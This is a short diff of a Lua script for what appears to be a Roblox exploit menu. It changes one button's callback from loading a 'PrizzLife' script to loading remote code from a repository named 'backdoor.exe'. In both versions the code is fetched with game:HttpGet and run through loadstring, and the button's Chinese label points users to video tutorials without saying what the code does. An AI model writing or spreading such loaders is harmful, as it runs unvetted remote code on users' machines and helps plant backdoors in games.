@@ -588,7 +588,7 @@ local Tab = Window:MakeTab({
 
 Tab:AddButton({
         Name = "脚本（使用教程：可以搜B站，或者快手等平台)",
-        Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/devguy100/PrizzLife/main/Source/release_v0.8.1.lua'))()
+        Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua'))()
           end
 })
 
